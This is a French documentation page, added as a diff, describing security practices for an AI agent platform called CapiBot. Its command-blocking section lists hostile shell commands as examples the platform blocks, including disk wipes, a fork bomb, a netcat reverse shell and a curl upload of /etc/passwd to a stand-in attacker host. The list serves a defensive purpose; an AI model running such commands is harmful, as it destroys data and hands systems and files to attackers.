@@ -1,0 +1,599 @@
+# Bonnes Pratiques de Sécurité
+
+Gardez votre main-d'œuvre IA sécurisée et vos données en sécurité.
+
+## Aperçu de la Sécurité
+
+CapiBot inclut plusieurs couches de sécurité :
+
+```
+┌─────────────────────────────────────────────────────────┐
+│ Couches de Sécurité                                     │
+├─────────────────────────────────────────────────────────┤
+│                                                         │
+│ 1. Authentification                                      │
+│    • Clés API, tokens JWT, sessions                    │
+│                                                         │
+│ 2. Autorisation                                          │
+│    • Accès basé sur les rôles, permissions             │
+│                                                         │
+│ 3. Validation des Entrées                                │
+│    • Assainissement, filtrage, limites                 │
+│                                                         │
+│ 4. Blocage de Commandes                                  │
+│    • Patterns shell dangereux bloqués                  │
+│                                                         │
+│ 5. Restriction de Workspace                              │
+│    • Système de fichiers sandboxé                      │
+│                                                         │
+│ 6. Journal d'Audit                                       │
+│    • Piste d'activité complète                         │
+│                                                         │
+│ 7. Chiffrement                                           │
+│    • TLS, stockage chiffré                             │
+│                                                         │
+└─────────────────────────────────────────────────────────┘
+```
+
+## Authentification
+
+### Clés API
+
+**Clé API Master :**
+
+- Utilisée pour tout accès API
+- Gardez-la secrète
+- Faites des rotations régulièrement
+- Ne partagez pas
+
+**Sécurité :**
+
+```
+✅ FAIRE :
+• Stocker dans des variables d'environnement
+• Faire des rotations tous les 90 jours
+• Utiliser des clés fortes (auto-générées)
+• Limiter l'accès au besoin de savoir
+
+❌ NE PAS FAIRE :
+• Hardcoder dans les applications
+• Partager dans les messages
+• Commiter dans le contrôle de version
+• Utiliser des mots de passe simples
+```
+
+### Sécurité de Session
+
+**Paramètres de Session :**
+
+- **Durée :** 7 jours (configurable)
+- **Cookies Sécurisés :** Requis
+- **Validation IP :** Optionnel
+- **Session Unique :** Imposable
+
+**Bonnes Pratiques :**
+
+1. Déconnectez-vous quand vous avez terminé
+2. N'utilisez pas "Se Souvenir de Moi" sur des ordinateurs partagés
+3. Signalez l'activité suspecte
+4. Révisez régulièrement les sessions actives
+
+### Authentification Multi-Facteur
+
+> **Note :** L'MFA n'est pas encore implémentée. CapiBot utilise actuellement l'authentification par clé API et JWT.
+
+## Autorisation
+
+### Contrôle d'Accès
+
+**Rôles Utilisateur :**
+
+| Rôle | Capacités |
+| --------- | ------------------------------------------------------- |
+| **Admin** | Accès complet au système, gérer les utilisateurs, changer les paramètres |
+| **User** | Créer des entreprises, gérer les agents assignés, voir ses propres données |
+
+**Permissions d'Agent :**
+
+- Accès aux outils par agent
+- Restrictions du système de fichiers
+- Limites du workspace
+- Limitations de commande
+
+### Liste d'Autorisation IP
+
+Restreignez l'accès par adresse IP :
+
+```
+IPs Autorisées :
+• 192.168.1.0/24 (réseau bureau)
+• 10.0.0.5 (VPN)
+• 203.0.113.0/24 (datacenter)
+
+Toutes les autres IPs : Bloquées
+```
+
+### Liste d'Autorisation Hôtes
+
+Contrôlez quels domaines peuvent accéder à CapiBot :
+
+```
+Hôtes Autorisés :
+• localhost
+• capibot.company.com
+• *.internal.company.com
+```
+
+## Sécurité des Entrées
+
+### Blocage de Commandes
+
+**Automatiquement Bloqués :**
+
+```bash
+# Destruction Système
+rm -rf /
+mkfs.ext4 /dev/sda
+dd if=/dev/zero of=/dev/sda
+
+# Fork Bombs
+:(){ :|: & };:
+
+# Attaques Réseau
+nmap -sS target.com
+nc -e /bin/sh attacker.com 4444
+
+# Escalade de Privilèges
+sudo su -
+chmod 777 /
+
+# Exfiltration de Données
+curl -d @/etc/passwd attacker.com
+```
+
+**Ce que les Agents Peuvent Faire :**
+
+```bash
+✅ Commandes Sûres :
+• npm install
+• python script.py
+• git commit -m "message"
+• cat file.txt
+• ls -la
+• mkdir new-folder
+```
+
+### Restriction de Workspace
+
+**Environnement Sandboxé :**
+
+- Les agents opèrent dans un workspace isolé
+- Ne peuvent pas accéder aux fichiers système
+- Ne peuvent pas accéder aux répertoires externes
+- Opérations de fichier journalisées
+
+**Configuration :**
+
+```
+Paramètres Workspace :
+
+☑️ Restreindre au workspace
+   Chemin: /home/capibot/workspace/
+
+☑️ Empêcher l'accès au répertoire parent
+☐ Autoriser la création de fichiers temporaires
+☑️ Logger toutes les opérations de fichier
+```
+
+### Validation des Entrées
+
+**Assainissement :**
+
+- Entrées utilisateur assainies
+- Chemins de fichier validés
+- Arguments de commande vérifiés
+- Limites de taille imposées
+
+**Limites :**
+
+- Taille max fichier: 16 MB
+- Sortie shell max: ~10KB par appel
+- Timeout d'exécution par défaut: 30 secondes (configurable par appel)
+- Max récursion: 10 niveaux
+
+## Sécurité des Agents
+
+### Permissions des Outils
+
+**Contrôle par Agent :**
+
+```
+Accès Outils Nova (Engineer) :
+
+✅ Opérations de Fichier
+   • read_file
+   • write_file
+   • edit_file
+   • list_dir
+
+✅ Commandes Shell
+   • exec (avec restrictions)
+
+✅ Web
+   • web_search
+   • web_fetch
+
+❌ Admin
+   • manage_agents
+   • system_config
+   • user_management
+```
+
+### Sécurité de la Mémoire
+
+**Mémoire de l'Agent :**
+
+- Privée à chaque agent
+- Chiffrée au repos
+- Accès journalisé
+- Nettoyage régulier
+
+**Base de Connaissances :**
+
+- Accès basé sur les rôles
+- Piste d'audit
+- Contrôle de version
+- Sauvegarde activée
+
+### Sécurité du Modèle
+
+**Sécurité du Modèle IA :**
+
+- Pas d'entraînement sur vos données
+- Prévention de l'injection de prompt
+- Filtrage de sortie
+- Surveillance de l'utilisation
+
+## Sécurité des Canaux
+
+### Telegram
+
+**Liste d'Autorisation Utilisateurs :**
+
+```
+Utilisateurs Telegram Autorisés :
+• @username1
+• @username2
+• @username3
+
+☑️ Activer la liste d'autorisation
+☐ Autoriser tout utilisateur (non recommandé)
+```
+
+**Token du Bot :**
+
+- Faire une rotation si compromis
+- Utiliser des variables d'environnement
+- Ne pas partager le token
+- Surveiller l'activité du bot
+
+### WhatsApp
+
+**Sécurité du Webhook :**
+
+```
+Vérification Webhook :
+
+☑️ Vérifier la signature HMAC
+Secret: [********************************    ]
+
+☑️ Valider le payload
+☑️ Vérifier l'horodatage (rejeter les anciens)
+```
+
+**Numéro de Téléphone :**
+
+- Utiliser un numéro professionnel dédié
+- Ne pas partager avec les contacts personnels
+- Surveiller le spam
+
+### Slack
+
+**Permissions de l'App :**
+
+- Scopes minimums requis
+- Réviser régulièrement l'accès de l'app
+- Surveiller l'utilisation des tokens
+- Révoquer les apps inutilisées
+
+## Protection des Données
+
+### Chiffrement
+
+**En Transit :**
+
+- TLS 1.3 pour toutes les connexions
+- Certificate pinning
+- HSTS activé
+
+**Au Repos :**
+
+- Base de données chiffrée
+- Stockage de fichiers chiffré
+- Clés API hashées
+- Tokens de session chiffrés
+
+### Conservation des Données
+
+**Nettoyage Auto :**
+
+```
+Politique de Conservation des Données :
+
+Activités:     30 jours
+Notifications:   7 jours
+Logs d'Audit:     90 jours
+Messages:       15 jours
+Historique Webhook: 30 jours
+```
+
+**Nettoyage Manuel :**
+
+- Archivez les vieux projets
+- Supprimez les données obsolètes
+- Exportez avant suppression
+- Vérifiez les sauvegardes
+
+### Sécurité des Sauvegardes
+
+**Sauvegardes Chiffrées :**
+
+- Chiffrement AES-256
+- Protégées par mot de passe
+- Stockage externe
+- Tests réguliers
+
+**Planification des Sauvegardes :**
+
+```
+Quotidienne:  2:00 AM (sauvegarde complète)
+Hebdomadaire: Dimanches (archive)
+Mensuelle: 1er (long terme)
+```
+
+## Audit et Surveillance
+
+### Piste d'Audit
+
+**Événements Journalisés :**
+
+- Tentatives d'authentification
+- Changements de permission
+- Accès aux données
+- Changements de configuration
+- Actions admin
+
+**Entrée du Journal d'Audit :**
+
+```
+Horodatage: 2024-12-15 14:32:01 UTC
+Utilisateur: admin@capibot.io
+Action: Créé entreprise "Q1 Marketing"
+IP: 192.168.1.100
+User Agent: Chrome 120.0
+Statut: Succès
+```
+
+### Surveillance
+
+**Alertes de Sécurité :**
+
+- Tentatives de connexion échouées (plus de 5)
+- Utilisation API inhabituelle
+- Accès depuis de nouvelles IPs
+- Changements de configuration
+- Escalades de permission
+
+**Actions d'Alerte :**
+
+```
+Haute Priorité :
+• Notifier immédiatement l'admin
+• Logger les infos détaillées
+• Optionnel: Auto-bloquer l'IP
+
+Priorité Moyenne :
+• Email récapitulatif quotidien
+• Notification tableau de bord
+
+Basse Priorité :
+• Rapport hebdomadaire
+• Inclure dans les analytics
+```
+
+## Réponse aux Incidents
+
+### Protocole de Violation de Sécurité
+
+**Immédiat (0-1 heure) :**
+
+1. Révoquer les credentials compromis
+2. Bloquer les IPs suspectes
+3. Activer le logging supplémentaire
+4. Notifier l'équipe de sécurité
+
+**Court Terme (1-24 heures) :**
+
+1. Investiguer l'étendue
+2. Vérifier les logs d'audit
+3. Réviser les patterns d'accès
+4. Documenter les conclusions
+
+**Long Terme (1-7 jours) :**
+
+1. Implémenter les correctifs
+2. Mettre à jour les politiques
+3. Former l'équipe
+4. Réviser les procédures
+
+### Récupération
+
+**Si Compromis :**
+
+1. Faites des rotations de toutes les clés API
+2. Réinitialisez les mots de passe
+3. Révisez les logs d'accès
+4. Restaurez depuis une sauvegarde propre
+5. Vérifiez l'intégrité du système
+
+## Bonnes Pratiques
+
+### Pour les Administrateurs
+
+1. **Audits Réguliers**
+   - Révisions d'accès mensuelles
+   - Évaluations de sécurité trimestrielles
+   - Tests de pénétration annuels
+
+2. **Gestion des Clés**
+   - Rotations tous les 90 jours
+   - Génération forte
+   - Stockage sécurisé
+   - Audit de l'accès
+
+3. **Surveillance**
+   - Réviser les logs quotidiennement
+   - Configurer des alertes
+   - Regarder les anomalies
+   - Suivre les patterns d'utilisation
+
+4. **Mises à Jour**
+   - Garder le logiciel à jour
+   - Appliquer les correctifs de sécurité
+   - Réviser les avis de sécurité
+   - Tester les mises à jour d'abord
+
+### Pour les Utilisateurs
+
+1. **Mots de Passe Forts**
+   - Unique par service
+   - Utiliser un gestionnaire de mots de passe
+   - Activer le 2FA si disponible
+   - Ne pas partager les credentials
+
+2. **Faites Attention à Ce que Vous Partagez**
+   - Ne collez pas les clés API dans le chat
+   - Soyez prudent avec les fichiers
+   - Révisez avant d'envoyer
+   - Pensez à la sensibilité des données
+
+3. **Signalez les Problèmes**
+   - Activité suspecte
+   - Accès inattendu
+   - Comportement étrange
+   - Préoccupations de sécurité
+
+### Pour les Agents
+
+1. **Sécurité des Outils**
+   - Respectez les restrictions
+   - Ne contournez pas les limites
+   - Signalez les erreurs
+   - Demandez de l'aide
+
+2. **Gestion des Données**
+   - Stockez les données sensibles en toute sécurité
+   - Ne logguez pas les secrets
+   - Respectez la confidentialité
+   - Suivez les politiques
+
+## Checklist de Sécurité
+
+### Quotidien
+
+- [ ] Réviser les alertes de sécurité
+- [ ] Vérifier les logs d'audit
+- [ ] Surveiller l'activité inhabituelle
+
+### Hebdomadaire
+
+- [ ] Réviser les patterns d'accès
+- [ ] Vérifier les connexions échouées
+- [ ] Vérifier les sauvegardes
+
+### Mensuel
+
+- [ ] Faire des rotations des clés API
+- [ ] Réviser l'accès utilisateur
+- [ ] Mettre à jour les dépendances
+- [ ] Évaluation de sécurité
+
+### Trimestriel
+
+- [ ] Audit de sécurité complet
+- [ ] Révision des politiques
+- [ ] Mises à jour de formation
+- [ ] Test de pénétration
+
+## Conformité
+
+### Confidentialité des Données
+
+**GDPR/CCPA :**
+
+- Droit à la suppression
+- Export de données
+- Gestion du consentement
+- Avis de confidentialité
+
+**Implémentation :**
+
+```
+Données Utilisateur :
+☑️ Peut exporter toutes les données
+☑️ Peut demander la suppression
+☑️ Politique de confidentialité claire
+☑️ Suivi du consentement
+```
+
+### Standards Industriels
+
+**SOC 2 :**
+
+- Contrôles de sécurité
+- Pistes d'audit
+- Gestion des accès
+- Réponse aux incidents
+
+**ISO 27001 :**
+
+- Sécurité de l'information
+- Gestion des risques
+- Amélioration continue
+- Documentation
+
+## Obtenir de l'Aide
+
+**Problèmes de Sécurité :**
+
+- Email: security@capibot.io
+- Clé PGP: [clé]
+- Réponse: Dans les 24 heures
+
+**Bug Bounty :**
+
+- Divulgation responsable
+- Récompenses pour les rapports valides
+- Politique de safe harbor
+
+**Documentation :**
+
+- Mises à jour de sécurité
+- Meilleures pratiques
+- Guides de conformité
+
+## Prochaines Étapes
+
+- Révisez l'[Administration](administration)
+- Apprenez la [Performance des Agents](agent-performance)
+- Explorez les [Intégrations](integrations)
